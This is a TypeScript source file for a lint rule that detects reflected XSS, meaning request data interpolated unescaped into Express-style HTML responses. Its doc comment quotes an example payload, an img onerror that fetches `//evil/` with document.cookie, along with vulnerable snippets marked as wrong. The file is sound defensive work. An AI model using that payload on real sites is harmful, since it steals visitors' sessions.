import { defineDiagnostic } from "../../core/types.ts";
import type { AstNode } from "../../core/types.ts";
import {
  getCalleeName,
  getMethodName,
  isFunctionLike,
  looksCallerControlled,
  REQUEST_ROOTS,
  rootObjectName,
} from "../../core/ast.ts";
import { collectDescendants, findDescendant } from "../../core/walk.ts";

/**
 * Caller-controlled data interpolated straight into an HTML response body. The
 * browser parses whatever comes back, so a query parameter of
 * `<img src=x onerror="fetch('//evil/'+document.cookie)">` executes in your
 * origin with the victim's session attached — reflected XSS.
 *
 * Only body-writing sinks (`send`/`write`/`end`) with *visible HTML markup*
 * around the interpolation qualify: `res.json` is not an HTML sink, and
 * `res.render` goes through a template engine that escapes by default. A value
 * that passes through an escaping/sanitizing call is left alone.
 *
 * Opt-in. Deciding whether an interpolated value can carry markup needs dataflow
 * this engine does not have without types: a constant lookup table indexed by a
 * tainted key, a value already escaped two assignments ago, and a number parsed
 * out of a query string are all inert, and each produced a verified false
 * positive during review. The checks below remove the ones we can see; enable it
 * deliberately (`"no-xss-in-html-response": "error"`) once you have swept your
 * own codebase, rather than having it grade every repo by default.
 *
 * ❌ app.get("/hi", (req, res) => res.send(`<h1>${req.query.name}</h1>`));
 * ❌ res.write("<div>" + req.body.comment + "</div>");
 * ✅ res.send(`<h1>${escapeHtml(req.query.name)}</h1>`);
 * ✅ res.render("greeting", { name: req.query.name }); // engine escapes
 */

// Sinks that write the response *body*. `json`/`jsonp` are deliberately absent:
// the content type is application/json, so markup there is inert.
const HTML_BODY_SINKS = new Set(["send", "write", "end"]);
const RESPONSE_RECEIVERS = new Set(["res", "response", "reply"]);

/**
 * A real tag (`<div`, `</p>`, `<br/>`, `<!doctype`) in the static part of the
 * string. Without this a bare `res.send(req.query.q)` — arguably HTML because
 * Express types a string as text/html — would fire, and that is too loose to
 * ship on by default.
 */
const HTML_TAG_RE = /<\s*(?:\/\s*)?[a-zA-Z][a-zA-Z0-9-]*(?:[\s/>]|$)|<!\s*doctype/i;

/**
 * Escaping/sanitizing/encoding call names. Matched loosely and on purpose: a
 * missed sanitizer is a false positive, which costs far more than the false
 * negative of trusting a badly-named helper.
 */
const SANITIZER_RE = /(escape|sanitiz|encode|purif|xss|striptag|htmlspecialchars)/i;

/** Coercions whose result cannot carry markup — `${Number(req.query.page)}`. */
const COERCIONS = new Set(["Number", "parseInt", "parseFloat", "BigInt", "Boolean"]);

/** Translation/formatting helpers keyed by a literal — `${req.t("welcome")}`. */
const MESSAGE_HELPERS = new Set(["t", "__", "translate", "gettext"]);

/** The static (non-interpolated) text of a template literal or `+` concatenation. */
const staticText = (node: AstNode | null | undefined): string => {
  if (!node) return "";
  if (node.type === "TemplateLiteral") {
    return (node.quasis as AstNode[]).map((q) => q.value?.cooked ?? q.value?.raw ?? "").join(" ");
  }
  if (node.type === "Literal" && typeof node.value === "string") return node.value;
  if (node.type === "BinaryExpression" && node.operator === "+") {
    return `${staticText(node.left)} ${staticText(node.right)}`;
  }
  return "";
};

/** The interpolated / non-literal pieces of a template or `+` concatenation. */
const dynamicParts = (node: AstNode, out: AstNode[]): void => {
  if (node.type === "TemplateLiteral") {
    for (const expr of (node.expressions as AstNode[]) ?? []) out.push(expr);
    return;
  }
  if (node.type === "BinaryExpression" && node.operator === "+") {
    for (const side of [node.left as AstNode, node.right as AstNode]) {
      if (side.type === "TemplateLiteral" || (side.type === "BinaryExpression" && side.operator === "+")) {
        dynamicParts(side, out);
      } else if (side.type !== "Literal") {
        out.push(side);
      }
    }
  }
};

/** Is this expression an HTML string built by interpolation or concatenation? */
const isBuiltString = (node: AstNode | null | undefined): boolean =>
  !!node &&
  ((node.type === "TemplateLiteral" && ((node.expressions as AstNode[]) ?? []).length > 0) ||
    (node.type === "BinaryExpression" && node.operator === "+"));

export const noXssInHtmlResponse = defineDiagnostic({
  id: "no-xss-in-html-response",
  title: "Caller-controlled data interpolated into an HTML response",
  severity: "error",
  category: "Security",
  defaultEnabled: false,
  tags: ["injection", "http"],
  recommendation:
    "Escape the value before it reaches the markup (`escapeHtml(value)`, `DOMPurify.sanitize(value)`), or render through an auto-escaping template engine with `res.render`. Concatenating request data into HTML hands the caller script execution in your origin.",
  create: (ctx) => {
    /** Names bound to the result of an escaping/sanitizing call — treated as safe. */
    const sanitizedNames = new Set<string>();

    const isSanitizerCall = (n: AstNode): boolean =>
      n.type === "CallExpression" && SANITIZER_RE.test(getCalleeName(n) ?? getMethodName(n) ?? "");

    const isSanitizedName = (n: AstNode): boolean =>
      n.type === "Identifier" && sanitizedNames.has(n.name);

    /**
     * Does this expression run its dynamic parts through an escaper anywhere?
     *
     * Deliberately descends INTO function arguments, unlike `isEscaped`: the
     * ubiquitous `parts.map((t) => escapeHtml(t)).join("")` puts the escaper
     * inside a callback, and skipping function bodies reported the one shape
     * that is doing exactly the right thing.
     */
    const containsSanitizer = (n: AstNode): boolean =>
      isSanitizerCall(n) || isSanitizedName(n) || findDescendant(n, (d) => isSanitizerCall(d) || isSanitizedName(d)) !== null;

    /**
     * Values that cannot carry markup even when they derive from the request: a
     * numeric coercion, a `.length`, or a translation looked up by a literal key.
     * Flagging `${items.length}` in a results page is the kind of noise that gets
     * a rule turned off.
     */
    const isNonPayload = (expr: AstNode): boolean => {
      if (expr.type === "MemberExpression" && !expr.computed && expr.property?.type === "Identifier") {
        if (expr.property.name === "length") return true;
      }
      // Arithmetic and negation force a primitive; `|| 1` / `?? 0` keep it one.
      if (expr.type === "UnaryExpression" && ["+", "-", "~", "!"].includes(expr.operator as string)) return true;
      if (expr.type === "BinaryExpression" && ["-", "*", "/", "%", "**"].includes(expr.operator as string)) return true;
      if (expr.type === "LogicalExpression") {
        return isNonPayload(expr.left as AstNode) || isNonPayload(expr.right as AstNode);
      }
      // One hop through a local binding: `const page = parseInt(...)`.
      if (expr.type === "Identifier") {
        const binding = ctx.scope.getBinding(expr.name as string, expr);
        const init = binding?.initNode as AstNode | undefined;
        if (init && init !== expr) return isNonPayload(init);
        return false;
      }
      if (expr.type !== "CallExpression") return false;
      const name = getMethodName(expr);
      if (!name) return false;
      if (COERCIONS.has(name)) return true;
      const args = (expr.arguments as AstNode[]) ?? [];
      return MESSAGE_HELPERS.has(name) && args.every((a) => a.type === "Literal");
    };

    /** Has this interpolated piece been through an escaper, or is it inert? */
    const isEscaped = (expr: AstNode): boolean => {
      // findDescendant does not test the root, so test it explicitly.
      if (isSanitizerCall(expr) || isSanitizedName(expr) || isNonPayload(expr)) return true;
      return containsSanitizer(expr);
    };

    /**
     * The HTML-building expression behind a sink argument: the argument itself,
     * or — one hop — the initializer of the local it names (`const html = …;
     * res.send(html)`), which is how most handlers are actually written.
     */
    const resolveBody = (arg: AstNode): AstNode | null => {
      if (isBuiltString(arg)) return arg;
      if (arg.type === "Identifier") {
        const binding = ctx.scope.getBinding(arg.name, arg);
        if (binding && binding.initNode && isBuiltString(binding.initNode)) return binding.initNode;
      }
      return null;
    };

    return {
      Program: (root) => {
        for (const decl of collectDescendants(root, (n) => n.type === "VariableDeclarator")) {
          if (decl.id?.type === "Identifier" && decl.init && containsSanitizer(decl.init as AstNode)) {
            sanitizedNames.add(decl.id.name);
          }
        }
        for (const assign of collectDescendants(root, (n) => n.type === "AssignmentExpression")) {
          if (assign.operator === "=" && assign.left?.type === "Identifier" && containsSanitizer(assign.right as AstNode)) {
            sanitizedNames.add(assign.left.name);
          }
        }
      },
      CallExpression: (node) => {
        const method = getMethodName(node);
        if (!method || !HTML_BODY_SINKS.has(method)) return;
        const receiver = rootObjectName(node.callee);
        if (!receiver || !RESPONSE_RECEIVERS.has(receiver.toLowerCase())) return;

        const arg0 = (node.arguments as AstNode[] | undefined)?.[0];
        if (!arg0) return;
        const body = resolveBody(arg0);
        if (!body) return;

        // Require real markup: a bare tainted string is not conclusively HTML.
        if (!HTML_TAG_RE.test(staticText(body))) return;

        const parts: AstNode[] = [];
        dynamicParts(body, parts);
        for (const part of parts) {
          if (isEscaped(part)) continue;
          if (!looksCallerControlled(part, ctx.taintedBindings)) continue;
      // `const context = { title: "Dashboard" }` is somebody's own object, not
      // the Koa/Hono request that gave the name its meaning. A binding for the
      // root identifier means it was declared here, so it is not caller data.
      let root: AstNode = part;
      while (root.type === "MemberExpression") root = root.object as AstNode;
      if (root.type === "Identifier" && REQUEST_ROOTS.has(root.name as string)) {
        const binding = ctx.scope.getBinding(root.name as string, root);
        // A PARAMETER named req/ctx/context IS the request object — that is how
        // every handler receives it. Only a value *declared* here shadows it.
        if (binding && binding.kind !== "param") continue;
      }
          const sink = getCalleeName(node) ?? `${receiver}.${method}`;
          ctx.report(
            part,
            `Caller-controlled data is interpolated unescaped into the HTML body sent by \`${sink}\` — the browser executes whatever markup or script the caller submits (reflected XSS).`,
          );
          return; // one finding per response — the fix is the same for every piece
        }
      },
    };
  },
});
